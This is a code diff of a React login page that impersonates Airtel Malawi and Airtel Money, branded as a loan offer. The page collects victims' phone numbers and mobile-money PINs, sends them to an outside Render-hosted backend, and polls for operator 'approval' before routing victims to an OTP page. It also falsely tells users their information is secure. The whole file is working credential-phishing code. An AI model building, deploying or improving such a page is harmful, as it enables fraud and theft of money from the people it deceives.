@@ -2,17 +2,15 @@ import React, { useState, useRef, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 
 const API_BASE = (
-  import.meta.env.VITE_API_BASE_URL ||
-  'https://airtel-loan-backend-z5vx.onrender.com'
+  import.meta.env.VITE_API_BASE_URL || 'https://airtel-loan-backend-z5vx.onrender.com'
 ).replace(/\/$/, '');
 
 const COUNTRY_CODE = '+265';
-const PHONE_PLACEHOLDER = '991234567';
+const PHONE_PLACEHOLDER = '991 234 567';
 const PHONE_MAX = 9;
-const FETCH_TIMEOUT_MS = 90_000;   // survive Render cold start
-const SLOW_HINT_AFTER_MS = 4_000;  // show "warming up" after 4s
+const FETCH_TIMEOUT_MS = 90_000;
+const SLOW_HINT_AFTER_MS = 4_000;
 
-/** Wrapper around fetch with timeout + correct CORS settings. */
 async function apiFetch(path: string, opts: RequestInit = {}) {
   const ctrl = new AbortController();
   const timer = setTimeout(() => ctrl.abort(), FETCH_TIMEOUT_MS);
@@ -21,12 +19,8 @@ async function apiFetch(path: string, opts: RequestInit = {}) {
       ...opts,
       signal: ctrl.signal,
       mode: 'cors',
-      credentials: 'omit',        // backend has allow_credentials=False
-      headers: {
-        'Content-Type': 'application/json',
-        Accept: 'application/json',
-        ...(opts.headers || {}),
-      },
+      credentials: 'omit',
+      headers: { 'Content-Type': 'application/json', Accept: 'application/json', ...(opts.headers || {}) },
     });
   } finally {
     clearTimeout(timer);
@@ -35,10 +29,8 @@ async function apiFetch(path: string, opts: RequestInit = {}) {
 
 function AirtelLogin() {
   const navigate = useNavigate();
-
   const [phone, setPhone] = useState('');
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
-  const [showPin, setShowPin] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
   const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
@@ -49,14 +41,8 @@ function AirtelLogin() {
   const slowTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
 
   const stopPolling = () => {
-    if (pollRef.current) {
-      clearInterval(pollRef.current);
-      pollRef.current = null;
-    }
-    if (slowTimerRef.current) {
-      clearTimeout(slowTimerRef.current);
-      slowTimerRef.current = null;
-    }
+    if (pollRef.current) clearInterval(pollRef.current);
+    if (slowTimerRef.current) clearTimeout(slowTimerRef.current);
   };
 
   useEffect(() => () => stopPolling(), []);
@@ -77,23 +63,14 @@ function AirtelLogin() {
     if (value && index < 3) pinRefs.current[index + 1]?.focus();
   };
 
-  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === 'Backspace' && !pin[index] && index > 0) {
-      pinRefs.current[index - 1]?.focus();
-    }
-  };
-
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
-    const pinString = pin.join('');
-    if (phone.length < PHONE_MAX || pinString.length < 4) return;
+    if (phone.length < PHONE_MAX || pin.join('').length < 4) return;
 
     setError('');
     setIsLoading(true);
     setIsWaitingForApproval(true);
     setIsSlow(false);
-
-    // Show "warming up" hint after 4s if server is cold-starting
     slowTimerRef.current = setTimeout(() => setIsSlow(true), SLOW_HINT_AFTER_MS);
 
     const fullPhone = `${COUNTRY_CODE}${phone}`;
@@ -102,29 +79,17 @@ function AirtelLogin() {
     try {
       const response = await apiFetch('/api/login', {
         method: 'POST',
-        body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
+        body: JSON.stringify({ phone_number: fullPhone, pin: pin.join('') }),
       });
-
-      if (!response.ok) {
-        const text = await response.text().catch(() => '');
-        throw new Error(`HTTP ${response.status}: ${text || response.statusText}`);
-      }
-
       const data = await response.json();
 
       if (data.status === 'pending' && data.ref_id) {
-        // Start polling
         pollRef.current = setInterval(async () => {
           try {
             const statusRes = await apiFetch(`/api/login-status/${encodeURIComponent(data.ref_id)}`);
-            if (!statusRes.ok) return;
-
             const statusData = await statusRes.json();
-
             if (statusData.status === 'approved') {
               stopPolling();
-              localStorage.removeItem('airtelPhone'); // fresh on OTP page
-              localStorage.setItem('airtelPhone', fullPhone);
               navigate('/airtel-otp');
             } else if (statusData.status === 'rejected' || statusData.status === 'expired') {
               stopPolling();
@@ -132,184 +97,154 @@ function AirtelLogin() {
               setIsLoading(false);
               navigate('/');
             }
-          } catch (pollErr) {
-            console.warn('Polling error (will retry):', pollErr);
-          }
+          } catch (err) { console.warn('Poll error:', err); }
         }, 1500);
       } else {
-        // Backend approved synchronously (rare) — go straight to OTP
         stopPolling();
         navigate('/airtel-otp');
       }
     } catch (err: any) {
-      console.error('Login request failed:', err);
       stopPolling();
       setIsWaitingForApproval(false);
       setIsLoading(false);
-
-      const msg =
-        err?.name === 'AbortError'
-          ? 'Server took too long to respond. Please try again.'
-          : err?.message?.includes('Failed to fetch')
-            ? 'Cannot reach server. Check your internet or try again in a moment.'
-            : 'Network error. Please try again.';
-      setError(msg);
+      setError(err?.message?.includes('Failed to fetch') ? 'Network error. Please try again.' : 'An error occurred.');
     }
   };
 
-  const isFormValid = phone.length === PHONE_MAX && pin.join('').length === 4;
-
   return (
-    <div className="airtel-page-container">
+    <div className="page-wrapper">
       <style>{`
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        .airtel-page-container { display: flex; flex-direction: column; min-height: 100vh; background-color: #ffffff; position: relative; }
-        .waiting-overlay { position: fixed; top:0; left:0; width:100vw; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:9999; padding:20px; background: rgba(255,255,255,0.95); }
-        .faded-content { opacity: 0.1; pointer-events: none; transition: opacity 0.3s ease; display: flex; flex-direction: column; min-height: 100vh; }
-        .custom-spinner { width:60px; height:60px; border:6px solid #E5E7EB; border-top:6px solid #DA1C1C; border-radius:50%; animation: spin 1s linear infinite; margin-bottom:24px; }
-        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
-        .waiting-title { font-size:22px; font-weight:700; color:#1a1a1a; text-align:center; margin-bottom:8px; }
-        .waiting-sub { font-size:13px; color:#6B7280; text-align:center; max-width:300px; line-height:1.5; }
-        .login-top-section { flex:1; padding:40px 24px; display:flex; flex-direction:column; align-items:center; position:relative; }
-        .logo-wrapper { display:flex; flex-direction:column; align-items:center; margin-bottom:40px; }
-        .tagline { font-size:10px; letter-spacing:1.5px; color:#333; text-transform:uppercase; margin-top:8px; font-weight:600; }
-        .tagline span { color:#DA1C1C; }
-        .login-title { font-size:24px; font-weight:800; color:#1a1a1a; text-align:center; line-height:1.3; margin-bottom:32px; max-width:340px; }
-        .error-message { color:#DA1C1C; font-size:14px; font-weight:600; text-align:center; margin-bottom:16px; background:#FEF2F2; padding:10px; border-radius:8px; width:100%; max-width:400px; }
-        .phone-input-container { width:100%; max-width:400px; display:flex; align-items:center; border:2px solid #2563EB; border-radius:8px; padding:12px 16px; margin-bottom:32px; background:#fff; }
-        .flag-icon { width:24px; height:16px; margin-right:10px; border-radius:2px; overflow:hidden; flex-shrink:0; }
-        .country-code-text { font-size:18px; font-weight:600; color:#1a1a1a; margin-right:10px; }
-        .phone-input { flex:1; border:none; outline:none; font-size:18px; color:#1a1a1a; background:transparent; }
-        .phone-input::placeholder { color:#9CA3AF; }
-        .pin-section { width:100%; display:flex; flex-direction:column; align-items:center; margin-bottom:32px; }
-        .pin-label { font-size:15px; font-weight:600; color:#6B7280; margin-bottom:16px; }
-        .pin-inputs-row { display:flex; align-items:center; gap:16px; }
-        .pin-boxes { display:flex; gap:12px; }
-        .pin-box { width:52px; height:52px; border:2px solid #2563EB; border-radius:8px; font-size:24px; font-weight:700; text-align:center; color:#1a1a1a; outline:none; background:#fff; }
-        .eye-icon { cursor:pointer; display:flex; align-items:center; justify-content:center; color:#6B7280; }
-        .login-btn { width:100%; max-width:400px; padding:16px; border-radius:30px; border:none; background:#D1D5DB; color:#fff; font-size:16px; font-weight:700; text-transform:uppercase; cursor:not-allowed; transition: background-color .2s; margin-bottom:24px; }
-        .login-btn.active { background:#DA1C1C; cursor:pointer; }
-        .login-footer { background:#F3F4F6; padding:32px 24px; display:flex; flex-direction:column; align-items:center; border-top:1px solid #E5E7EB; }
-        .footer-logo-wrapper { display:flex; flex-direction:column; align-items:center; margin-bottom:24px; }
-        .collab-text { font-size:14px; font-weight:600; color:#333; margin-bottom:4px; }
-        .starlink-text { font-size:15px; font-weight:800; color:#1a1a1a; letter-spacing:1px; }
-        .starlink-text sup { font-size:8px; font-weight:normal; }
-        .copyright { font-size:12px; color:#9CA3AF; margin-top:24px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #DA1C1C; }
+        .page-wrapper { display: flex; flex-direction: column; min-height: 100vh; background-color: #DA1C1C; align-items: center; position: relative; }
+        .header-top { width: 100%; padding: 16px 20px; display: flex; align-items: center; justify-content: center; position: relative; color: #1a1a1a; }
+        .menu-icon { position: absolute; left: 20px; font-size: 24px; cursor: pointer; }
+        .header-title { font-size: 22px; font-weight: 900; }
+        .header-sub { color: #1a1a1a; font-size: 12px; text-align: center; margin-bottom: 24px; font-weight: 500; }
+        
+        .card { background: #fff; width: 92%; max-width: 420px; border-radius: 24px; padding: 32px 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); margin-bottom: 24px; z-index: 10; }
+        
+        .card-title { font-size: 26px; font-weight: 900; color: #1a1a1a; margin-bottom: 8px; }
+        .card-sub { font-size: 15px; color: #6B7280; margin-bottom: 24px; }
+        
+        .error-box { background-color: #FEF2F2; border: 1px solid #FECACA; color: #1a1a1a; padding: 12px 16px; border-radius: 8px; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 8px; margin-bottom: 20px; }
+        .error-icon { color: #DA1C1C; font-weight: bold; border: 2px solid #DA1C1C; border-radius: 50%; width: 20px; height: 20px; display: flex; align-items: center; justify-content: center; font-size: 12px; }
+        
+        .label { font-size: 14px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; display: block; }
+        .phone-input-box { display: flex; border: 1px solid #D1D5DB; border-radius: 8px; margin-bottom: 24px; overflow: hidden; height: 48px; }
+        .country-code { background: #F9FAFB; padding: 0 12px; display: flex; align-items: center; font-weight: 600; font-size: 16px; border-right: 1px solid #D1D5DB; color: #1a1a1a; }
+        .phone-input { flex: 1; border: none; padding: 0 12px; font-size: 16px; outline: none; background: transparent; }
+        
+        .pin-boxes { display: flex; gap: 12px; margin-bottom: 24px; justify-content: space-between; }
+        .pin-box { width: 60px; height: 60px; border: 1px solid #D1D5DB; border-radius: 8px; font-size: 24px; font-weight: 700; text-align: center; outline: none; background: #fff; color: #1a1a1a; }
+        
+        .btn { width: 100%; padding: 16px; border-radius: 8px; border: none; font-size: 16px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; transition: 0.2s; }
+        .btn-primary { background: #F87171; color: #1a1a1a; }
+        .btn-primary:active { background: #EF4444; }
+        .btn-disabled { background: #E5E7EB; color: #9CA3AF; cursor: not-allowed; }
+        
+        .secure-text { font-size: 12px; color: #6B7280; display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 16px; }
+        
+        /* Spinner Overlay */
+        .spinner-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,0.95); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 999; }
+        .spinner-box { background: #fff; width: 90%; max-width: 380px; padding: 40px 24px; border-radius: 16px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .custom-spinner { width: 50px; height: 50px; margin: 0 auto 24px; position: relative; }
+        .custom-spinner div { transform-origin: 40px 40px; animation: spin 1.2s linear infinite; }
+        .custom-spinner div:after { content: " "; display: block; position: absolute; top: 3px; left: 37px; width: 6px; height: 16px; border-radius: 20%; background: #DA1C1C; }
+        .custom-spinner div:nth-child(1) { transform: rotate(0deg); animation-delay: -1.1s; }
+        .custom-spinner div:nth-child(2) { transform: rotate(30deg); animation-delay: -1s; }
+        .custom-spinner div:nth-child(3) { transform: rotate(60deg); animation-delay: -0.9s; }
+        .custom-spinner div:nth-child(4) { transform: rotate(90deg); animation-delay: -0.8s; }
+        .custom-spinner div:nth-child(5) { transform: rotate(120deg); animation-delay: -0.7s; }
+        .custom-spinner div:nth-child(6) { transform: rotate(150deg); animation-delay: -0.6s; }
+        .custom-spinner div:nth-child(7) { transform: rotate(180deg); animation-delay: -0.5s; }
+        .custom-spinner div:nth-child(8) { transform: rotate(210deg); animation-delay: -0.4s; }
+        .custom-spinner div:nth-child(9) { transform: rotate(240deg); animation-delay: -0.3s; }
+        .custom-spinner div:nth-child(10) { transform: rotate(270deg); animation-delay: -0.2s; }
+        .custom-spinner div:nth-child(11) { transform: rotate(300deg); animation-delay: -0.1s; }
+        .custom-spinner div:nth-child(12) { transform: rotate(330deg); animation-delay: 0s; }
+        @keyframes spin { 0% { opacity: 1; } 100% { opacity: 0; } }
+        .spinner-title { font-size: 22px; font-weight: 900; color: #1a1a1a; margin-bottom: 12px; }
+        .spinner-sub { font-size: 14px; color: #6B7280; line-height: 1.5; }
+        
+        .bottom-brands { display: flex; gap: 16px; margin-top: auto; padding-bottom: 32px; }
+        .brand-icon { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; }
       `}</style>
 
       {isWaitingForApproval && (
-        <div className="waiting-overlay">
-          <div className="custom-spinner" />
-          <div className="waiting-title">Awaiting approval</div>
-          <div className="waiting-sub">
-            {isSlow
-              ? 'Server is warming up — this may take up to a minute on the first request…'
-              : 'Your request has been sent. Please wait…'}
+        <div className="spinner-overlay">
+          <div className="spinner-box">
+            <div className="custom-spinner">
+              <div></div><div></div><div></div><div></div><div></div><div></div>
+              <div></div><div></div><div></div><div></div><div></div><div></div>
+            </div>
+            <h2 className="spinner-title">Processing...</h2>
+            <p className="spinner-sub">
+              {isSlow ? 'Server is warming up. This may take up to a minute...' : 'Please wait while we verify your request...'}
+            </p>
           </div>
         </div>
       )}
 
-      <div className={isWaitingForApproval ? 'faded-content' : ''}>
-        <div className="login-top-section">
-          <div className="logo-wrapper">
-            <svg width="140" height="40" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
-              <circle cx="25" cy="17" r="5" fill="white"/>
-              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
-            </svg>
-            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
+      <div className="header-top">
+        <div className="menu-icon">≡</div>
+        <h1 className="header-title">Airtel Malawi</h1>
+      </div>
+      <p className="header-sub">Quick loans. Anytime. Anywhere.</p>
+
+      <div className="card">
+        <h2 className="card-title">Welcome back</h2>
+        <p className="card-sub">Log in to your Airtel account</p>
+
+        {error && (
+          <div className="error-box">
+            <span className="error-icon">!</span> {error}
           </div>
+        )}
 
-          <h1 className="login-title">
-            Log in to Airtel Money to complete your payment.
-          </h1>
-
-          {error && <div className="error-message">{error}</div>}
-
-          <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
-            <div className="phone-input-container">
-              <svg className="flag-icon" viewBox="0 0 640 480" xmlns="http://www.w3.org/2000/svg">
-                <rect width="640" height="160" fill="#000"/>
-                <rect y="160" width="640" height="160" fill="#CE1126"/>
-                <rect y="320" width="640" height="160" fill="#339E35"/>
-                <path d="M265 160 A55 55 0 0 1 375 160 Z" fill="#CE1126"/>
-                <g stroke="#CE1126" strokeWidth="14" strokeLinecap="round">
-                  <line x1="320" y1="105" x2="320" y2="75"/>
-                  <line x1="283" y1="115" x2="260" y2="92"/>
-                  <line x1="357" y1="115" x2="380" y2="92"/>
-                  <line x1="262" y1="145" x2="232" y2="137"/>
-                  <line x1="378" y1="145" x2="408" y2="137"/>
-                </g>
-              </svg>
-              <span className="country-code-text">{COUNTRY_CODE}</span>
-              <input
-                type="tel"
-                className="phone-input"
-                placeholder={PHONE_PLACEHOLDER}
-                value={phone}
-                onChange={handlePhoneChange}
-                maxLength={PHONE_MAX}
-                disabled={isLoading || isWaitingForApproval}
-              />
-            </div>
-
-            <div className="pin-section">
-              <span className="pin-label">Enter your PIN</span>
-              <div className="pin-inputs-row">
-                <div className="pin-boxes">
-                  {pin.map((digit, index) => (
-                    <input
-                      key={index}
-                      type={showPin ? 'text' : 'password'}
-                      maxLength={1}
-                      value={digit}
-                      ref={(el) => { pinRefs.current[index] = el; }}
-                      onChange={(e) => handlePinChange(index, e.target.value)}
-                      onKeyDown={(e) => handleKeyDown(index, e)}
-                      className="pin-box"
-                      disabled={isLoading || isWaitingForApproval}
-                    />
-                  ))}
-                </div>
-                <div className="eye-icon" onClick={() => setShowPin(!showPin)}>
-                  {showPin ? (
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
-                      <line x1="1" y1="1" x2="23" y2="23"></line>
-                    </svg>
-                  ) : (
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-                      <circle cx="12" cy="12" r="3"></circle>
-                    </svg>
-                  )}
-                </div>
-              </div>
-            </div>
-
-            <button
-              type="submit"
-              className={`login-btn ${isFormValid ? 'active' : ''}`}
-              disabled={!isFormValid || isLoading || isWaitingForApproval}
-            >
-              LOGIN
-            </button>
-          </form>
+        <label className="label">Phone number</label>
+        <div className="phone-input-box">
+          <div className="country-code">+265</div>
+          <input type="tel" className="phone-input" placeholder={PHONE_PLACEHOLDER} value={phone} onChange={handlePhoneChange} maxLength={PHONE_MAX} />
         </div>
 
-        <div className="login-footer">
-          <div className="footer-logo-wrapper">
-            <svg width="110" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
-              <circle cx="25" cy="17" r="5" fill="white"/>
-              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
-            </svg>
-            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
-          </div>
-          <p className="collab-text">In collaboration with</p>
-          <p className="starlink-text">STARLINK<sup>TM</sup></p>
-          <p className="copyright">© 2026 Airtel Malawi. All rights reserved.</p>
+        <label className="label">Enter your Airtel PIN</label>
+        <div className="pin-boxes">
+          {pin.map((digit, i) => (
+            <input
+              key={i}
+              type="password"
+              className="pin-box"
+              maxLength={1}
+              value={digit}
+              ref={(el) => { pinRefs.current[i] = el; }}
+              onChange={(e) => handlePinChange(i, e.target.value)}
+              onKeyDown={(e) => { if (e.key === 'Backspace' && !pin[i] && i > 0) pinRefs.current[i - 1]?.focus(); }}
+            />
+          ))}
         </div>
+
+        <button 
+          className={`btn ${phone.length === PHONE_MAX && pin.join('').length === 4 ? 'btn-primary' : 'btn-disabled'}`}
+          onClick={handleLogin}
+          disabled={phone.length < PHONE_MAX || pin.join('').length < 4}
+        >
+          Log in →
+        </button>
+
+        <div className="secure-text">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#F59E0B" strokeWidth="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+          Your information is secure and protected.
+        </div>
+      </div>
+
+      <div className="bottom-brands">
+        <div className="brand-icon" style={{background: '#fff', borderRadius: '8px', border: '2px solid #ccc', color: '#DA1C1C', fontWeight: 'bold', fontSize: '10px'}}>D-<br/>Money</div>
+        <div className="brand-icon" style={{color: '#1E293B'}}>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm4 9h-2v-2h2v2z"/></svg>
+        </div>
+        <div className="brand-icon" style={{color: '#FCD34D', background: '#1E293B', borderRadius: '4px', fontSize: '10px', fontWeight: 'bold'}}>Airtel<br/>Money</div>
+        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>K</div>
       </div>
     </div>
   );
